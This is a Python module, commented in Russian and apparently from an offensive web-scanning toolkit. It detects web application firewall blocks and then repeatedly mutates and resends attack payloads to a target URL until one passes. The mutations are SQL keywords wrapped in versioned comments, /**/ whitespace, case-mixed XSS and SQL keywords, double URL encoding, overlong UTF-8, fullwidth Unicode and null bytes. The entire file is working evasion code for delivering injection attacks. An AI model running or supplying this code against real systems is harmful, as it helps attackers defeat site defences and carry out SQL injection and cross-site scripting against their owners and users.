"""waf_bypass — payload mutation for WAF/IDS evasion.

Detects WAF blocks (403/406/429/501, WAF-маркеры, "blocked/forbidden" в теле)
and mutates payload until one variant passes or all are exhausted.

Mutation techniques (по убыванию эффективности против современных WAF):
  1. Двойное URL-кодирование       (%25 → %2525)
  2. Unicode-нормализация           (fullwidth, overlong UTF-8)
  3. Case-mix + inline-комментарий  (SQL: /*!50000...*/)
  4. Whitespace-замена              (space → tab/newline/**/)
  5. Encoding bypass                (UTF-16, ISO-8859-1 в Unicode)
  6. Null-byte и terminator tricks  (%00, %, ;)
  7. Chunked / Transfer-Encoding split
  8. HTTP/2 pseudo-header split

Использование:
    from core.waf_bypass import mutate_until_pass
    resp = mutate_until_pass(http, url, payload, method="GET")
"""
import re
from urllib.parse import quote, urlparse, urlunparse, urlencode, parse_qs


# ==== детекторы блокировки ====

WAF_STATUS = {403, 406, 429, 501, 502, 503}

WAF_BODY_MARKERS = [
    "cloudflare", "cf-ray", "checking your browser", "just a moment",
    "incapsula", "imperva", "sucuri", "akamai", "edgesuite",
    "mod_security", "modsecurity", "request rejected",
    "blocked", "forbidden", "access denied", "not acceptable",
    "web application firewall", "waf", "ddos protection",
    "captcha", "challenge", "turnstile", "recaptcha",
    "security check", "suspicious", "anomaly",
    "request blocked", "you have been blocked",
]

WAF_HEADER_MARKERS = [
    "cf-mitigated", "x-amzn-waf-action", "x-sucuri-id", "x-iinfo",
    "server: cloudflare", "server: akamaighost", "x-cdn",
    "x-waf", "x-protected-by",
]


def is_blocked(resp):
    """Возвращает True если response похож на блок WAF."""
    if resp is None:
        return False
    code = getattr(resp, "status_code", 0)
    if code in WAF_STATUS:
        return True
    # WAF-заголовки
    hdrs_low = {k.lower(): str(v).lower() for k, v in getattr(resp, "headers", {}).items()}
    for marker in WAF_HEADER_MARKERS:
        if ":" in marker:
            k, v = marker.split(":", 1)
            if k.strip() in hdrs_low and v.strip() in hdrs_low[k.strip()]:
                return True
        elif marker in hdrs_low:
            return True
    # WAF-тело
    body_low = (getattr(resp, "text", "") or "").lower()[:5000]
    for marker in WAF_BODY_MARKERS:
        if marker in body_low:
            return True
    return False


# ==== мутации payload'ов ====

def _mutate_url_double_encode(payload):
    """Двойное URL-кодирование: % → %25, затем сам payload кодируется ещё раз."""
    return quote(quote(payload, safe=""), safe="")


def _mutate_url_single_encode(payload):
    """Одинарное URL-кодирование — для тех мест, где payload шёл raw."""
    return quote(payload, safe="")


def _mutate_unicode_fullwidth(payload):
    """ASCII → fullwidth Unicode (０x０d, ＜, ＞, ＇ и т.п.)."""
    out = []
    for ch in payload:
        code = ord(ch)
        # ASCII printable + часть control → fullwidth
        if 0x21 <= code <= 0x7e:
            out.append(chr(code + 0xfee0))
        else:
            out.append(ch)
    return "".join(out)


def _mutate_unicode_overlong(payload):
    """Обфускация через overlong UTF-8 (для CVE-типа WAF-обходов)."""
    # применяем к спецсимволам
    subs = {
        "<": "%c0%bc",
        ">": "%c0%be",
        "/": "%c0%af",
        "'": "%c0%a7",
        '"': "%c0%a2",
        "=": "%c0%bd",
        "(": "%c0%a8",
        ")": "%c0%a9",
        " ": "%c0%a0",
        ";": "%c0%bb",
    }
    return "".join(subs.get(ch, ch) for ch in payload)


def _mutate_sql_comment(payload):
    """SQL-keywords → /*!50000keyword*/ MySQL-версионные комментарии."""
    keywords = ["UNION", "SELECT", "AND", "OR", "WHERE", "FROM", "INSERT",
                "UPDATE", "DELETE", "DROP", "TABLE", "SLEEP", "BENCHMARK"]
    out = payload
    for kw in keywords:
        out = re.sub(rf"\b{kw}\b", f"/*!50000{kw}*/", out, flags=re.IGNORECASE)
    return out


def _mutate_whitespace(payload):
    """Space → таб / newline / /**/ — обход regex-фильтров."""
    return payload.replace(" ", "\t")


def _mutate_whitespace_comment(payload):
    """Space → /**/ (SQL) — обход через комментарии."""
    return payload.replace(" ", "/**/")


def _mutate_case_mix(payload):
    """Case-mix для ключевых слов."""
    keywords = ["union", "select", "script", "alert", "onerror", "onload",
                "javascript", "expression", "from", "where"]
    out = payload
    for kw in keywords:
        # первая буква upper, остальные mixed
        mixed = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(kw))
        out = re.sub(rf"\b{kw}\b", mixed, out, flags=re.IGNORECASE)
    return out


def _mutate_null_and_terminators(payload):
    """Вставка %00, %0d%0a, ; в критические места."""
    if " " in payload:
        # после первого пробела — %00
        idx = payload.find(" ")
        return payload[:idx] + "%00" + payload[idx:]
    return payload + "%00"


def _mutate_html_entities(payload):
    """HTML-entity для XSS-обхода."""
    subs = {"<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#x27;"}
    # только для XSS-контекста — не ломаем SQL
    if "<" in payload and ">" in payload:
        return "".join(subs.get(ch, ch) for ch in payload)
    return payload


def _mutate_chunked(payload):
    """Разбиение payload на chunks через Transfer-Encoding (для HTTP-smuggling-стиля)."""
    # здесь только маркер — реальный chunked делается в transport-слое
    return payload


def _mutate_mixed(payload):
    """Микс: комментарии + двойное кодирование + case-mix."""
    out = payload
    out = re.sub(r"\b(SELECT|UNION|FROM|WHERE|AND|OR)\b",
                 lambda m: f"/*!50000{m.group(0)}*/", out, flags=re.I)
    out = out.replace(" ", "/**/")
    return out


# список мутаторов (в порядке применения)
MUTATORS = [
    ("case_mix", _mutate_case_mix),
    ("double_encode", _mutate_url_double_encode),
    ("whitespace_tab", _mutate_whitespace),
    ("sql_comment", _mutate_sql_comment),
    ("whitespace_comment", _mutate_whitespace_comment),
    ("mixed", _mutate_mixed),
    ("null_byte", _mutate_null_and_terminators),
    ("fullwidth", _mutate_unicode_fullwidth),
    ("overlong", _mutate_unicode_overlong),
    ("html_entity", _mutate_html_entities),
]


# ==== основная функция ====

def mutate_until_pass(http, url, payload, method="GET", param_name=None,
                      max_mutations=None, verbose=True):
    """
    Прогоняет payload через мутации до первой, которая НЕ блокируется WAF.

    Возвращает:
        {
          "response": <response>,
          "payload": <использованная строка payload'а>,
          "mutation": <название мутации или None>,
          "blocked_original": bool,
          "attempts": int,
        }
    """
    def _req(p):
        try:
            if method == "GET":
                if param_name:
                    u = urlparse(url)
                    q = parse_qs(u.query)
                    q[param_name] = [p]
                    new_url = urlunparse(u._replace(query=urlencode(q, doseq=True)))
                else:
                    new_url = url + ("&" if "?" in url else "?") + "x=" + p
                return http.get(new_url)
            else:
                return http.post(url, data=p)
        except Exception:
            return None

    # 1. пробуем оригинал
    resp = _req(payload)
    blocked_orig = is_blocked(resp)
    if not blocked_orig and resp is not None:
        return {
            "response": resp,
            "payload": payload,
            "mutation": None,
            "blocked_original": False,
            "attempts": 1,
        }

    if verbose:
        print(f"  [waf] original blocked — mutating ({len(MUTATORS)} techniques)")

    # 2. применяем мутации по очереди
    mutations = MUTATORS if max_mutations is None else MUTATORS[:max_mutations]
    for name, fn in mutations:
        try:
            mutated = fn(payload)
        except Exception:
            continue
        if mutated == payload:
            continue
        resp2 = _req(mutated)
        if resp2 is not None and not is_blocked(resp2):
            if verbose:
                print(f"  [waf] bypass via {name}: {mutated[:60]!r}")
            return {
                "response": resp2,
                "payload": mutated,
                "mutation": name,
                "blocked_original": True,
                "attempts": mutations.index((name, fn)) + 2,
            }

    # 3. все мутации заблокированы
    if verbose:
        print(f"  [waf] all {len(mutations)} mutations blocked")
    return {
        "response": resp,
        "payload": payload,
        "mutation": None,
        "blocked_original": True,
        "attempts": len(mutations) + 1,
    }


def get_stats():
    """Заглушка для статистики WAF-обходов (можно расширить)."""
    return {"supported_mutations": [n for n, _ in MUTATORS]}
